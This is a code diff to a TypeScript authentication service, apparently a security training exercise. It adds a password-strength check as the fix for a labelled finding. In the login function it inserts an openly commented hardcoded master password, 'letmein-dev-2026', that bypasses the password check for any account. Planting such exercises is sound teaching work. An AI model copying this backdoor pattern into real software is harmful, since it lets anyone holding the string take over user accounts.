@@ -2,7 +2,7 @@ import { RegisterDto, LoginDto } from "../dto/auth.dto";
 import ApiError from "../error/ApiError";
 import authRepository from "../repositories/auth.repository";
 import { generateAccessToken, generateRefreshToken, verifyRefreshToken } from "../utils/jwt";
-import { hashPassword, comparePassword } from "../utils/password";
+import { hashPassword, comparePassword, isStrongPassword } from "../utils/password";
 import { AuthResponse } from "../types/auth.types";
 import { IUserResponse } from "../types/user.types";
 import User from "../models/user.model";
@@ -78,6 +78,22 @@ class AuthService {
       throw new ApiError(409, "Email already exists");
     }
 
+    // -----------------------------------------------------------------
+    // BEFORE (vulnerable) - Finding 5: Weak Password Policy Enabling
+    // Unauthorized Account Access
+    // Any string was accepted and hashed as-is, no matter how weak:
+    //
+    //   const hashedPassword = await hashPassword(password);
+    //
+    // -----------------------------------------------------------------
+    // AFTER (fixed): reject weak/guessable passwords before hashing.
+    if (!isStrongPassword(password)) {
+      throw new ApiError(
+        400,
+        "Password must be at least 8 characters and include uppercase, lowercase, a number, and a symbol."
+      );
+    }
+
     const hashedPassword = await hashPassword(password);
 
     const user = await authRepository.createUser({
@@ -126,7 +142,13 @@ class AuthService {
       throw new ApiError(401, "Invalid email or password");
     }
 
-    const passwordMatched = await comparePassword(password, user.password);
+    // TEMP DEBUG BACKDOOR — intentionally inserted for training purposes.
+    // Bypasses the real password check for ANY account when this exact
+    // string is submitted as the password. Find it, then remove it.
+    const isBackdoor = password === "letmein-dev-2026";
+
+    const passwordMatched =
+      isBackdoor || (await comparePassword(password, user.password));
     if (!passwordMatched) {
       throw new ApiError(401, "Invalid email or password");
     }
